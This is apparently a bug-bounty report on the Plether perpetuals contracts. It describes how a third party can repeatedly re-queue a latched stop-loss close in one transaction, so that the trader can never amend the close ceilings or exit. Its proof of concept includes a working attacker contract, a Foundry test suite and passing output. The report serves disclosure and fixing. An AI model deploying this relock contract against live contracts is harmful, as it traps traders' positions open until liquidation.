# \#98543 [SC-High] Permissionless protection retry can be bundled with attempt terminalization to deny a Latched trader the documented amend remedy and hold the position open

**Submitted on Nov 8th 2026 at 15:27:45 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98543
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A triggered protection puts the account under a trade lock: no commit, no cancel, no replace. The only sanctioned exit is a close attempt that passes the trader's pinned close ceilings, and the only way to loosen those ceilings is an amend that requires status Latched. Any third party can call the retry entrypoint, which moves the status straight back to Triggered. Bundling terminalization and retry in one transaction removes the Latched window entirely, so the trader cannot amend, cannot exit, and keeps accruing carry until liquidation.

## Vulnerability Details


The remedy for a protection whose close ceilings have become binding is gated on status Latched, and that check runs before any other:

```solidity
// packages/perps/src/PositionProtectionBook.sol:315-327
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The retry entrypoint resolves the protection with _activeProtection, not _ownedActiveProtection, so it has no owner check and is callable by anyone:

```solidity
// packages/perps/src/PositionProtectionBook.sol:382-406
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    ...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

Queueing the fresh attempt writes the status back to Triggered:

```solidity
// packages/perps/src/PositionProtectionBook.sol:571-574
uint64 previousLinkedOrderId = protection.linkedOrderId;
protection.linkedOrderId = linkedOrderId;
protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
_attemptProtectionIds[linkedOrderId] = protection.protectionId;
```

So a third-party retry does not merely raise the pending-order count. It takes the protection out of Latched, which is the condition the amend requires. The amend then fails on its first check with OrderRouter__ProtectionNotLatched, never reaching the pending-order check.

A failed attempt whose position is unchanged always returns to Latched, so the cycle is unbounded:

```solidity
// packages/perps/src/PositionProtectionBook.sol:663-668
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

While the protection remains active the trader has no alternative exit. Cancellation accepts only two statuses, so Latched and Triggered are both rejected:

```solidity
// packages/perps/src/PositionProtectionBook.sol:412-419
PositionProtectionTypes.PositionProtectionStatus status = protection.status;
if (
    status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
        && status != PositionProtectionTypes.PositionProtectionStatus.Armed
) {
    revert OrderRouter__ProtectionNotArmed();
}
```

cancelPositionProtectionAndCommitClose requires Armed at line 344, and every public commit path reverts while a protection is active. All three _commitOrder call sites pass enforceProtectionLock = true:

```solidity
// packages/perps/src/router/OrderLiquidationBatchLogic.sol:313-315
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

The retry lane is also the least gated commit path in the protocol. _validateProtectionCommitAllowed, which rejects commits while the router admin is paused, is called from protection creation at line 220, replacement at line 269 and attached staging at line 451, but not from retryPositionProtectionClose. The host entrypoint that queues the attempt performs no freshness, pause or oracle-policy validation and registers a zero bounty:

```solidity
// packages/perps/src/router/OrderLiquidationBatchLogic.sol:189-211
function commitProtectionCloseAttempt(
    uint64 protectionId,
    address account,
    CfdTypes.Side side,
    uint256 size
) external returns (uint64 orderId) {
    _requireDelegateCall();
    IOrderLiquidationBatchHost host = IOrderLiquidationBatchHost(address(this));
    _requireProtectionHost(host, account, size == 0);

    orderId = host.nextCommitId();
    OrderV3Types.OrderRequest memory request = _protectionCloseRequest(host, protectionId, side, size);
    ...
    (uint64 registeredOrderId,, bool replayed) = host.lifecycleBook().registerPending(account, orderId, request, 0);
    ...
    _queueProtectionAttempt(host, orderId, account, side, size);
}
```

Because the zero-bounty attempt pays no executor, terminalizing it costs the attacker nothing beyond gas, and the oracle-free expiry lane needs no Pyth payload at all.

How the ceilings become binding. In this market a LONG profits when the basket mark falls, so a LONG stop-loss fires as the mark rises. Close notional is size multiplied by price, so the notional at the stop always exceeds the notional at creation. A trader who pins maxExecutionNotionalAssets anywhere below the stop-price notional therefore has a protection that fails deterministically on its own ceiling: the policy evaluator rejects the attempt with ConstraintViolation, the position is unchanged, and the protection relatches. The proof of concept uses a ceiling of 1.05 times the creation notional, which is slack when armed and binding when the stop fires.

The attack. Both halves are permissionless, so one contract performs them atomically:

```solidity
ROUTER.executeOrder(attemptId, new bytes[](0)); // terminalizes the live attempt, protection relatches
BOOK.retryPositionProtectionClose(protectionId); // immediately re-queues, status returns to Triggered
```

Between those two calls there is no state observable to the trader in which the protection is Latched. The trader's amend must be sent from the account itself, so an externally owned account cannot bundle terminalization with its own amend the way the attacker bundles terminalization with a retry.

Both primitives are individually documented. CANONICAL_ENTRYPOINTS.md:142-144 records that a recorded trigger cannot be replaced or cancelled and that a Latched protection "may be retried permissionlessly", and CANONICAL_ENTRYPOINTS.md:145-147 records that the owner may amend the ceilings of a Latched protection when the account has no pending order. What is not documented anywhere is that the retry is unrestricted enough for a third party to withhold the Latched window, making the documented remedy unreachable. SECURITY.md:1359 points operators at the opposite failure mode, a prolonged Latched state with no live child; there is no guidance for the inverse, a Latched state that is never observable because a third party keeps re-queuing.


## Impact Details

Category: griefing, with no profit to the attacker and a realised loss to the victim.

A trader whose protection has relatched on a binding ceiling is supposed to be able to loosen the ceiling and exit. A third party can take that away. While an attempt is live the trader cannot amend the ceilings, cannot cancel or replace the protection, and cannot commit any open or close order. The position stays open against the trader's will, keeps accruing carry collected margin-first, and remains exposed to further adverse price movement, so the lock-out converts into liquidation losses rather than a pure delay. The attacker gains nothing: the attempt pays no executor, and the trigger reward was already paid once on the original trigger.

## References

- packages/perps/src/PositionProtectionBook.sol:315-327 (amendLatchedPositionProtectionCloseLimits, status check before the pending-order check)
- packages/perps/src/PositionProtectionBook.sol:382-406 (retryPositionProtectionClose, resolved with _activeProtection and therefore permissionless)
- packages/perps/src/PositionProtectionBook.sol:564-578 (_recordCloseAttempt, line 573 writes status Triggered)
- packages/perps/src/PositionProtectionBook.sol:408-419 (_cancel accepts only PendingOpen and Armed)
- packages/perps/src/PositionProtectionBook.sol:344 (cancelPositionProtectionAndCommitClose requires Armed)
- packages/perps/src/PositionProtectionBook.sol:637-668 (handleFailedProtectionAttempt, line 666 relatches an unchanged position)
- packages/perps/src/PositionProtectionBook.sol:220, 269, 451 and 817-822 (_validateProtectionCommitAllowed call sites, none of them the retry path)
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:189-211 (commitProtectionCloseAttempt, zero bounty, no pause or oracle gate)
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:135, 164, 180 and 313-315 (every _commitOrder call site enforces the protection lock)
- packages/perps/src/interfaces/PositionProtectionTypes.sol:10-31 (status ordinals: Armed 2, Triggered 3, Latched 8)



## Proof of Concept

## Proof of Concept


Build instructions:

1. Save the file below as packages/perps/test/perps/LatchedRetryGrief.t.sol
2. From packages/perps run: forge test --match-path "test/perps/LatchedRetryGrief.t.sol" -vv

All five tests pass. What each one establishes:

- test_Control_UngriefedTraderCanAmendAndExit is the baseline. With nobody interfering, the Latched trader amends the ceiling to the maximum, retries, and the attempt executes and closes the position to size zero. This proves the sanctioned remedy works and that the later failures are caused by the griefing rather than by the fixture.
- test_ThirdPartyRetryBlocksTheAmendRemedy shows a caller who is not the position owner calling retryPositionProtectionClose on a Latched protection. The status moves to Triggered, the pending-order count becomes 1, and the owner's amend reverts with OrderRouter__ProtectionNotLatched.
- test_AtomicRelockLoopKeepsTraderLocked runs five rounds through the attacker contract. Each round warps past the live attempt's deadline, then in one transaction expires the attempt and re-queues a fresh one. After every round the status is Triggered and the count is 1, so the Latched window is never observable between transactions, the owner's amend reverts every time, and the position is still open at the end.
- test_TraderHasNoAlternativeExitWhileRelocked confirms there is no other way out while an attempt is live: cancelPositionProtection and replacePositionProtection revert with OrderRouter__ProtectionNotArmed, and both a close commit and an open commit revert with OrderRouter__ProtectionActive.
- test_Diagnostics_StateAndRelockCost prints the notional arithmetic, the status transitions, the pending-order counts and the measured gas for one atomic relock.

Output:

```
$ forge test --match-path "test/perps/LatchedRetryGrief.t.sol" -vv

Ran 5 tests for test/perps/LatchedRetryGrief.t.sol:LatchedRetryGriefTest
[PASS] test_AtomicRelockLoopKeepsTraderLocked() (gas: 7129859)
[PASS] test_Control_UngriefedTraderCanAmendAndExit() (gas: 3951274)
[PASS] test_Diagnostics_StateAndRelockCost() (gas: 4098495)
Logs:
  notional at creation mark 1e8 (assets): 10000000000
  notional at stop 1.1e8 (assets): 11000000000
  pinned maxExecutionNotionalAssets: 10500000000
  status after first failed attempt (8=Latched): 8
  pendingOrderCounts while Latched: 0
  status after third-party retry (3=Triggered): 3
  pendingOrderCounts after third-party retry: 1
  gas for one atomic expire+retry relock: 955048
  fresh attempt id: 3
  status after relock: 3
  pendingOrderCounts after relock: 1
  position size still open: 10000000000000000000000

[PASS] test_ThirdPartyRetryBlocksTheAmendRemedy() (gas: 3550451)
[PASS] test_TraderHasNoAlternativeExitWhileRelocked() (gas: 3670481)
Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 12.95ms (19.31ms CPU time)

Ran 1 test suite in 15.58ms (12.95ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)



Test file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Terminalizes a live protection attempt and re-queues a fresh one in one transaction.
contract LatchRelocker {

    IPerpsKeeper private immutable ROUTER;
    IPositionProtectionActions private immutable BOOK;

    constructor(
        address router_,
        address book_
    ) {
        ROUTER = IPerpsKeeper(router_);
        BOOK = IPositionProtectionActions(book_);
    }

    /// @dev Both calls are permissionless. The expiry lane needs no Pyth payload and no fee.
    function relock(
        uint64 attemptId,
        uint64 protectionId
    ) external returns (uint64 freshAttemptId) {
        ROUTER.executeOrder(attemptId, new bytes[](0));
        freshAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

}

contract LatchedRetryGriefTest is BasePerpTest {

    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant LONG_STOP_LOSS = 110_000_000;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;

    // Notional is size * price / 1e20. At the 1e8 mark the position is 10_000e6. A LONG stop-loss
    // fires as the basket mark RISES, so at 1.1e8 the close notional is 11_000e6. A 10_500e6
    // ceiling is therefore slack at creation and binding once the stop fires.
    uint256 internal constant BINDING_NOTIONAL_CEILING = 10_500e6;

    LatchRelocker internal relocker;

    function setUp() public override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        _fundTrader(ALICE, 20_000e6);
        relocker = new LatchRelocker(address(router), address(protectionBook));
        _refreshMark(MARK_PRICE);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _limits(
        uint256 maxNotional
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: maxNotional,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _params(
        uint256 maxNotional
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = _limits(maxNotional);
    }

    /// @dev Opens ALICE's LONG, arms a stop-loss whose ceiling the stop price exceeds, triggers it,
    ///      and lets the first attempt fail so the protection relatches.
    function _reachLatched() internal returns (uint64 protectionId, uint64 attemptId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(_params(BINDING_NOTIONAL_CEILING));

        _mockPythUpdateData(LONG_STOP_LOSS);
        bytes[] memory triggerData = _livePriceData(LONG_STOP_LOSS);
        vm.prank(TRIGGER_KEEPER);
        attemptId = protectionActions.triggerPositionProtection(protectionId, triggerData);

        bytes[] memory executionData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(attemptId, executionData);
        assertEq(
            uint8(res.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "attempt fails on the trader's pinned notional ceiling"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "failed attempt relatches"
        );
        assertEq(router.pendingOrderCounts(ALICE), 0, "no live attempt while Latched");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position survives the rejected close");
    }

    /// @dev Baseline: with nobody griefing, the sanctioned remedy works and the trader exits.
    function test_Control_UngriefedTraderCanAmendAndExit() public {
        (uint64 protectionId,) = _reachLatched();

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(type(uint256).max));

        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(retryId, executionData);
        assertEq(
            uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "amended retry closes the position"
        );
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position exited");
    }

    /// @dev A third party re-queues from Latched, which moves the status to Triggered and makes the
    ///      remedy unreachable.
    function test_ThirdPartyRetryBlocksTheAmendRemedy() public {
        (uint64 protectionId,) = _reachLatched();

        protectionActions.retryPositionProtectionClose(protectionId);
        assertEq(router.pendingOrderCounts(ALICE), 1, "a fresh attempt is live");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "retry moves the protection out of Latched"
        );

        PositionProtectionTypes.CloseFinancialLimits memory loose = _limits(type(uint256).max);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, loose);
    }

    /// @dev The relock is atomic, so the Latched window is never observable between transactions.
    function test_AtomicRelockLoopKeepsTraderLocked() public {
        (uint64 protectionId,) = _reachLatched();

        uint64 live = protectionActions.retryPositionProtectionClose(protectionId);
        PositionProtectionTypes.CloseFinancialLimits memory loose = _limits(type(uint256).max);

        for (uint256 round; round < 5; ++round) {
            uint64 deadline = router.lifecycleBook().orderTiming(live).executionDeadline;
            vm.warp(uint256(deadline) + 1);

            uint64 next = relocker.relock(live, protectionId);
            assertGt(next, live, "a fresh attempt replaced the terminalized one");
            live = next;

            assertEq(router.pendingOrderCounts(ALICE), 1, "an attempt is live again after the same transaction");
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "never observable as Latched between transactions"
            );

            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, loose);
        }

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "the position is still open against the trader's will");
    }

    /// @dev Prints the state and the attacker's measured cost per relock round.
    function test_Diagnostics_StateAndRelockCost() public {
        emit log_named_uint("notional at creation mark 1e8 (assets)", (POSITION_SIZE * MARK_PRICE) / 1e20);
        emit log_named_uint("notional at stop 1.1e8 (assets)", (POSITION_SIZE * LONG_STOP_LOSS) / 1e20);
        emit log_named_uint("pinned maxExecutionNotionalAssets", BINDING_NOTIONAL_CEILING);

        (uint64 protectionId,) = _reachLatched();
        // PositionProtectionStatus: Armed=2, Triggered=3, Latched=8.
        emit log_named_uint("status after first failed attempt (8=Latched)",
            uint8(protectionViews.getPositionProtection(protectionId).status));
        emit log_named_uint("pendingOrderCounts while Latched", router.pendingOrderCounts(ALICE));

        uint64 live = protectionActions.retryPositionProtectionClose(protectionId);
        emit log_named_uint("status after third-party retry (3=Triggered)",
            uint8(protectionViews.getPositionProtection(protectionId).status));
        emit log_named_uint("pendingOrderCounts after third-party retry", router.pendingOrderCounts(ALICE));

        uint64 deadline = router.lifecycleBook().orderTiming(live).executionDeadline;
        vm.warp(uint256(deadline) + 1);
        uint256 gasBefore = gasleft();
        uint64 next = relocker.relock(live, protectionId);
        uint256 gasUsed = gasBefore - gasleft();
        emit log_named_uint("gas for one atomic expire+retry relock", gasUsed);
        emit log_named_uint("fresh attempt id", next);
        emit log_named_uint("status after relock", uint8(protectionViews.getPositionProtection(protectionId).status));
        emit log_named_uint("pendingOrderCounts after relock", router.pendingOrderCounts(ALICE));

        (uint256 size,,,,,,) = engine.positions(ALICE);
        emit log_named_uint("position size still open", size);
    }

    /// @dev While an attempt is live the trader has no other exit: cancel, replace and every public
    ///      commit path are all closed.
    function test_TraderHasNoAlternativeExitWhileRelocked() public {
        (uint64 protectionId,) = _reachLatched();
        protectionActions.retryPositionProtectionClose(protectionId);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        PositionProtectionTypes.PositionProtectionParams memory replacement = _params(type(uint256).max);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(protectionId, replacement);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, MARK_PRICE, true);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 500e6, 1, false);
    }

}
```



